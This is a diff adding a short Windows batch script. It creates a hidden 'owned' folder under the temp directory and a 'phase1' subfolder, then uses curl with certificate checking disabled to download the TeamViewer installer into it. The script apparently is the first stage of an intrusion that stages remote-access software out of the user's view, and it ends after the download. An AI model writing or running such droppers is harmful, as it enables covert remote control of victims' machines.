@@ -1,0 +1,5 @@
+@echo off 
+mkdir "%tmp%\owned"
+attrib +h "%tmp%\owned"
+mkdir "%tmp%/owned/phase1"
+curl -k "https://download.teamviewer.com/download/TeamViewer_Setup.exe" -o "%tmp%/owned/phase1/TeamViewer_Setup.exe"
